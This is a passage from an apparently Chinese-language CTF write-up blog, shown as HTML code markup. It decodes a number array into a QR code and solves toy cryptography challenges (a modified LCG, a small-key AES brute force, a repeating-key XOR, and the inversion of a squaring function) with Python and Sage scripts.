class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">65</span>, <span class="number">61</span>, <span class="number">61</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>10进制转字符串，base64解码得到：</p><p><code>0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000</code></p><p>37*37的01字符串，转为二维码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#xx27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">37</span>,<span class="number">37</span>))</span><br><span class="line">width , height = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">37</span>*i+j]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>扫码得flag：<code>flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="LinearEquations"><a href="#LinearEquations" class="headerlink" title="LinearEquations"></a>LinearEquations</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my_LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed1 , seed2</span>):</span></span><br><span class="line">        self.state = [seed1,seed2]</span><br><span class="line">        self.n = getPrime(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.a = bytes_to_long(flag[:<span class="number">8</span>])</span><br><span class="line">            self.b = bytes_to_long(flag[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">            self.c = bytes_to_long(flag[<span class="number">16</span>:])</span><br><span class="line">            <span class="keyword">if</span> self.a &lt; self.n <span class="keyword">and</span> self.b &lt; self.n <span class="keyword">and</span> self.c &lt; self.n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        new = (self.a * self.state[-<span class="number">1</span>] + self.b * self.state[-<span class="number">2</span>] + self.c) % self.n</span><br><span class="line">        self.state.append( new )</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    lcg = my_LCG(getRandomInteger(<span class="number">64</span>),getRandomInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data = &quot;</span> + <span class="built_in">str</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(lcg.n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main() </span><br><span class="line"></span><br><span class="line"><span class="comment"># data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]</span></span><br><span class="line"><span class="comment"># n = 10104483468358610819</span></span><br></pre></td></tr></table></figure></blockquote><p>魔改三参数LCG，利用满足的公式 $as_{i-1}+bs_{i-2}+c \equiv s_i \pmod n$，得到三元一次同余方程组，利用Gröbner基求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d = [<span class="number">2626199569775466793</span>, <span class="number">8922951687182166500</span>, <span class="number">454458498974504742</span>, <span class="number">7289424376539417914</span>, <span class="number">8673638837300855396</span>]</span><br><span class="line">n = <span class="number">10104483468358610819</span></span><br><span class="line">PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = (a*d[<span class="number">1</span>]+b*d[<span class="number">0</span>]+c-d[<span class="number">2</span>])</span><br><span class="line">f2 = (a*d[<span class="number">2</span>]+b*d[<span class="number">1</span>]+c-d[<span class="number">3</span>])</span><br><span class="line">f3 = (a*d[<span class="number">3</span>]+b*d[<span class="number">2</span>]+c-d[<span class="number">4</span>])</span><br><span class="line">Fs = [f1, f2, f3]</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    m += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;L1near_Equ4t1on6_1s_34sy&#x27;</span></span><br></pre></td></tr></table></figure><p>拼接：<code>cazy&#123;L1near_Equ4t1on6_1s_34sy&#125;</code></p><p>​    </p><h3 id="no-can-no-bb"><a href="#no-can-no-bb" class="headerlink" title="no_can_no_bb"></a>no_can_no_bb</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] ==<span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">m</span>):</span></span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(m)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,key</span>):</span></span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = pad(flag)</span><br><span class="line">    key = pad(long_to_bytes(random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">20</span>)))</span><br><span class="line">    c = encrypt(flag,key)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>random范围不大，爆破key解AES-ECB：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">x</span>):</span></span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> x + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,key</span>):</span></span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">20</span>):</span><br><span class="line">        key = pad(long_to_bytes(i))</span><br><span class="line">        c = <span class="string">b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br><span class="line">        m = decrypt(c,key)</span><br><span class="line">        <span class="keyword">if</span> m.startswith(<span class="string">b&#x27;cazy&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            </span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;n0_c4n,bb?n0p3!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) &lt;= <span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">can_encrypt</span>(<span class="params">flag,key</span>):</span></span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="built_in">len</span>(key) + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag,new_key)])</span><br><span class="line"></span><br><span class="line">c = can_encrypt(flag,key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>key为5位，已知flag头5位，与密文异或得<code>key = b&#39;\x5f\x11\x32\xff\x61&#39;</code>，再异或密文还原明文：</p><p><code>cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</code></p><p>​    </p><h3 id="no-math-no-cry"><a href="#no-math-no-cry" class="headerlink" title="no_math_no_cry"></a>no_math_no_cry</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">80</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sec_encry</span>(<span class="params">m</span>):</span></span><br><span class="line">    cip = (m - (<span class="number">1</span>&lt;&lt;<span class="number">500</span>))**<span class="number">2</span> + <span class="number">0x0338470</span></span><br><span class="line">    <span class="keyword">return</span> cip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = sec_encry(m)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>简单逆回去就好，注意一下开方取负值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line">c -= <span class="number">0x0338470</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span 